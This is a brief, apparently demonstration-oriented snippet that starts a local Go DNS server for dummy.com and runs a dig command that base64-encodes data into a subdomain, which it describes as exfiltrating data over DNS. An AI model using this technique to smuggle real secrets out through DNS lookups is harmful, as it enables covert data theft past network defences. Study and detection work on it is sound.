```
# start the DNS server handling dummy.com on localhost:53000
go run main.go

# do a DNS query that exfiltrates data and observe the server logs
dig $(echo -n data | base64).dummy.com @localhost -p 53000 +short
```
